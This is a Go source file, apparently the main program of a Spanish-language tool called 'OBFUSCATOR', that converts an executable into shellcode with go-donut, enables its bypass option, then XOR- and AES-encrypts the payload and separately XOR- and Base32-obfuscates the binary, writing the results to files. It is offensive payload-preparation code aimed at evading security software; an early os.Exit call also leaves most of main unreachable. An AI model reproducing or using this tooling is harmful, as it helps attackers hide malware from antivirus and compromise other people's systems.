package main

import (
	"crypto/rand"
	"encoding/base64"
	"flag"
	"io"
	"log"
	"os"
	"strings"
	"time"

	"github.com/Binject/go-donut/donut"
	"github.com/Fatake/ShellCodeOfuscator/cipher"
	"github.com/Fatake/ShellCodeOfuscator/shellcoder"
	"github.com/fatih/color"
)

type FlagsType struct {
	inputFile string
	arch      string
}

var banner_1 = `

░█████╗░██████╗░███████╗██╗░░░██╗░██████╗░█████╗░░█████╗░████████╗░█████╗░██████╗░
██╔══██╗██╔══██╗██╔════╝██║░░░██║██╔════╝██╔══██╗██╔══██╗╚══██╔══╝██╔══██╗██╔══██╗
██║░░██║██████╦╝█████╗░░██║░░░██║╚█████╗░██║░░╚═╝███████║░░░██║░░░██║░░██║██████╔╝
██║░░██║██╔══██╗██╔══╝░░██║░░░██║░╚═══██╗██║░░██╗██╔══██║░░░██║░░░██║░░██║██╔══██╗
╚█████╔╝██████╦╝██║░░░░░╚██████╔╝██████╔╝╚█████╔╝██║░░██║░░░██║░░░╚█████╔╝██║░░██║
░╚════╝░╚═════╝░╚═╝░░░░░░╚═════╝░╚═════╝░░╚════╝░╚═╝░░╚═╝░░░╚═╝░░░░╚════╝░╚═╝░░╚═╝
by Fatake

`

func opciones() *FlagsType {
	inputFile := flag.String("f", "", "Ruta del binario a ofuscar")
	archstring := flag.String("a", "x84", "Arquitectura para generar shellcode Targ: x32,x64,x84")
	flag.Parse()
	return &FlagsType{*inputFile, *archstring}
}

func getdata() ([]byte, *FlagsType) {
	menu := opciones()
	if menu.inputFile == "" {
		log.Fatal("[!] Requiere binario, user -h para ver la ayuda")
	}

	dataFile, err := os.ReadFile(menu.inputFile)
	if err != nil {
		log.Fatal(err)
	}
	return dataFile, menu
}

func main() {
	color.Cyan(banner_1)
	shellcoder.Launch()
	os.Exit(1)
	dataFile, menu := getdata()
	/*
		Donut is a position-independent code that enables in-memory execution of
		VBScript, JScript, EXE, DLL files and dotNET assemblies
	*/
	var donutarch donut.DonutArch
	switch strings.ToLower(menu.arch) {
	case "x32", "386":
		donutarch = donut.X32

	case "x64", "amd64":
		donutarch = donut.X64

	case "x84":
		donutarch = donut.X84
	default:
		log.Fatal("[!] Arquitectura No soportada para generacion de payloads")
	}

	color.Blue("[i] Generando payload con donut")
	config := new(donut.DonutConfig)
	config.Arch = donutarch
	config.Entropy = donut.DONUT_ENTROPY_DEFAULT
	config.InstType = donut.DONUT_INSTANCE_PIC
	config.Type = donut.DONUT_MODULE_EXE
	config.Bypass = 3
	config.Format = 1
	config.Compress = 1

	payload, err := donut.ShellcodeFromFile(menu.inputFile, config)
	if err != nil {
		log.Println(err)
	}

	readBuf, _ := io.ReadAll(payload)
	encrypt := cipher.XorEncoder(readBuf, 31)
	key := make([]byte, 32)
	nonce := make([]byte, 12)
	rand.Read(key)
	rand.Read(nonce)

	raw2 := cipher.AESEncrypt(encrypt, key, nonce)

	color.Blue("[i] Realizando proceso de cifrado AES")

	time.Sleep(4 * time.Second)
	color.Green("[+] Key: " + base64.StdEncoding.EncodeToString(key))
	color.Green("[+] nonce: " + base64.StdEncoding.EncodeToString(nonce))

	os.WriteFile("shellcode.txt", raw2, 0644)

	color.Blue("[+] Shellcode Generado")
	////
	// XOR Part
	////
	color.Blue("\n[i] Realizando proceso de cifrado Xor")
	cifrar := cipher.XorEncoder(dataFile, 60)

	// obs es la variable que contiene el resultado final de la obfuscacion
	obs := cipher.Base32CustomEncoder(string(cifrar))

	os.WriteFile("obs.txt", []byte(obs), 0777)
	color.Yellow("[+] Archivo Ofuscado Exitosamente")

}
